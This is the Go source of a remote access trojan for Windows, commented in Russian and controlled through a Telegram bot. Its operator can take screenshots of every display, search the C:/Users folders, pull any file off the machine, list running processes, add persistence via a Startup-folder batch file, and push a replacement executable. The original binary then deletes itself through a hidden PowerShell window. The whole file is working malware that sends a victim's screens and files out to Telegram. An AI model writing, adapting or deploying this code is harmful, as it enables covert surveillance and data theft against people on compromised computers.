package main

import (
	"crypto/sha256"
	"errors"
	"fmt"
	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/kardianos/osext"
	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows"
	"image/png"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
)

/*поиск фаилов на пк(отправка списка путей совпавших фаилов)
отправка фаила при запросе через путь к фаилу, если фаил существует
отправка скриншотов
отправка списка запущенных процессов
добавление в автозагрузку
обновление
*/

/*
init

Создаёт каталоги (если их нет)
screenshotOut
*/
func init() {
	if _, err := os.Stat("screenshotOut"); err != nil {
		lErr := os.Mkdir("screenshotOut", 0777)
		if lErr != nil {
			panic(lErr)
		}
	}
}

func main() {
	TelegramBot()
}

/*
TelegramBot

связь с телеграммом
*/
func TelegramBot() {
	var chatId int64 = 11111111 //ваш чат id
	botApiToken := "Ваш токен"
	bot, err := tgbotapi.NewBotAPI(botApiToken)
	if err != nil {
		panic(err)
	}

	bot.Debug = true

	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 30
	updates := bot.GetUpdatesChan(updateConfig)
	for update := range updates {
		if update.Message == nil {
			continue
		}
		if update.Message.Chat.ID != chatId {
			continue
		}
		if update.Message.Command() == "screenshot" {
			response := CaptureFirstDisplay()
			if response != "" {
				msg := tgbotapi.NewPhoto(chatId, tgbotapi.FilePath(response))
				if _, err := bot.Send(msg); err != nil {
					panic(err)
				}
			}
			continue
		}
		if update.Message.Command() == "screenshotAll" {
			response := CaptureAllDisplay()
			for i := 0; i < len(response); i++ {
				if response[i] != "" {
					msg := tgbotapi.NewPhoto(chatId, tgbotapi.FilePath(response[i]))
					if _, err := bot.Send(msg); err != nil {
						panic(err)
					}
				}
			}
			continue
		}
		if update.Message.Command() == "find" {
			if len(update.Message.Text) > 6 {
				response := findFiles(update.Message.Text[6:])
				if len(response) >= 1 {
					strResponse := strings.Join(response, "\n")
					msg := tgbotapi.NewMessage(chatId, strResponse)
					if _, err := bot.Send(msg); err != nil {
						panic(err)
					}
				} else {
					msg := tgbotapi.NewMessage(chatId, "Фаилов с таким названием нет")
					if _, err := bot.Send(msg); err != nil {
						panic(err)
					}
				}
			}
			continue
		}
		if update.Message.Command() == "download" {
			msg := tgbotapi.NewDocument(chatId, tgbotapi.FilePath(update.Message.Text[10:]))
			if _, err := bot.Send(msg); err != nil {
				panic(err)
			}
			continue
		}
		if update.Message.Command() == "listProcess" {
			response := listProcess()
			response = removeDuplicateStr(response)
			strResponse := strings.Join(response, "\n")
			msg := tgbotapi.NewMessage(chatId, strResponse)
			if _, err := bot.Send(msg); err != nil {
				panic(err)
			}
			continue
		}
		if update.Message.Command() == "autorun" {
			autorun()
			msg := tgbotapi.NewMessage(chatId, "Добавлено в автозагрузку")
			if _, err := bot.Send(msg); err != nil {
				panic(err)
			}
		}
		if update.Message.Document != nil {
			url, err := bot.GetFileDirectURL(update.Message.Document.FileID)
			if err != nil {
				log.Fatalln(err)
			}
			err = downloadFile(url, "fsnew.exe")
			if err != nil {
				log.Fatal(err)
			}
			updateProgram()
		}

		msg := tgbotapi.NewMessage(chatId, "/screenshot - захват первого монитора\n"+
			"/screenshotAll - захват всех мониторов\n"+
			"/find <маска> - поиск фаилов по маске в папке users\n"+
			"/download <!точный путь до фаила!> - отправка фаила с пк (не более 50мб)\n"+
			"/listProcess - отправляет список процессов запущенных на пк\n"+
			"/autorun - добавляет программу в автозагрузку\n"+
			"отправить фаил для обновления или замены программы удалённого доступа")
		if _, err := bot.Send(msg); err != nil {
			panic(err)
		}
	}
}

/*
CaptureFirstDisplay

Захватывает скриншот с активного экрана,
сохраняет на диск в папку screenshotOut(папка должна существовать) рядом с программой,
возвращает имя фаилов
*/
func CaptureFirstDisplay() string {
	bounds := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		panic(err)
	}

	fileName := fmt.Sprintf("screenshotOut/%dx%d.png", bounds.Dx(), bounds.Dy())

	file, _ := os.Create(fileName)
	defer file.Close()

	err = png.Encode(file, img)
	if err != nil {
		panic(err)
	}

	return fileName
}

/*
CaptureAllDisplay

Захватывает скриншоты со всех экранов,
сохраняет на диск в папку screenshotOut(папка должна существовать) рядом с программой,
возвращает имена фаилов
*/
func CaptureAllDisplay() []string {
	n := screenshot.NumActiveDisplays()

	files := make([]string, n)

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}

		fileName := fmt.Sprintf("screenshotOut/%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())

		files[i] = fileName

		file, _ := os.Create(fileName)
		defer file.Close()

		err = png.Encode(file, img)
		if err != nil {
			panic(err)
		}
	}
	return files
}

/*
findFiles

Ищет фаилы по названию в папке C:/Users
возвращает массив имён фаилов
*/
func findFiles(mask string) []string {
	files := make([]string, 0)
	filepath.Walk("C:/users", func(path string, info os.FileInfo, err error) error {
		if strings.Contains(filepath.Base(path), mask) {
			files = append(files, path)
		}
		return nil
	})
	return files
}

/*
hash

возвращает хеш любой строки
Пример человекочитаемого вывода fmt.Printf("%x\n", hash("main"))
*/
func hash(s string) []byte {
	h := sha256.New()
	h.Write([]byte(s))
	return h.Sum(nil)
}

func generateName(lenght int) string {
	var random_name string
	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ")
	for i := 0; i < lenght; i++ {
		random_name += string(chars[rand.Intn(len(chars))])
	}
	return random_name + ".exe"
}

const processEntrySize = 568

/*
listProcess

возвращает список запущенных процессов windows в виде массива
рекомендуется удалять повторяющиеся названия
*/
func listProcess() []string {
	h, e := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if e != nil {
		panic(e)
	}
	process := make([]string, 0)
	p := windows.ProcessEntry32{Size: processEntrySize}
	for {
		e := windows.Process32Next(h, &p)
		if e != nil {
			break
		}
		s := windows.UTF16ToString(p.ExeFile[:])
		process = append(process, s)
	}
	return process
}

/*
removeDuplicateStr

Удаляет повторяющиеся строки
*/
func removeDuplicateStr(strSlice []string) []string {
	allKeys := make(map[string]bool)
	list := []string{}
	for _, item := range strSlice {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

/*
autorun

Добавление в автозагрузку, посредством добавления bat в папку автозагрузки
*/
func autorun() {
	dir, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	pathUser, _ := user.Current()
	if err != nil {
		panic(err)
	}
	if _, err := os.Stat(fmt.Sprintf("%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startFs.bat", pathUser)); err != nil {
		autorunBut, err := os.Create(fmt.Sprintf(
			"%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startFs.bat",
			pathUser.HomeDir,
		))
		if err != nil {
			panic(err)
		}
		_, err = autorunBut.Write([]byte(fmt.Sprintf("@echo off\ncd %s\nstart fs.exe\nexit", dir)))
		if err != nil {
			panic(err)
		}
	}
}

/*
Создаёт или переписывает bat автозагрузки
Переименовывает загруженный фаил
Удаляет сам себя
TODO запускать фаил вместе с удалением
*/
func updateProgram() {
	randomName := generateName(3)
	os.Rename("fsnew.exe", randomName)
	dir, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	pathUser, _ := user.Current()
	autorunBut, err := os.Create(fmt.Sprintf(
		"%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startFs.bat",
		pathUser.HomeDir,
	))
	if err != nil {
		panic(err)
	}
	_, err = autorunBut.Write([]byte(fmt.Sprintf("@echo off\ncd %s\nstart %s\nexit", dir, randomName)))
	if err != nil {
		panic(err)
	}

	filename, _ := osext.Executable()

	cmd := exec.Command("powershell", "del", filename)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		panic(err)
	}
}

/*
downloadFile
скачивает фаил по указанному url
*/
func downloadFile(URL, fileName string) error {
	response, err := http.Get(URL)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	if response.StatusCode != 200 {
		return errors.New("Received non 200 response code")
	}
	file, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(file, response.Body)
	if err != nil {
		return err
	}

	return nil
}
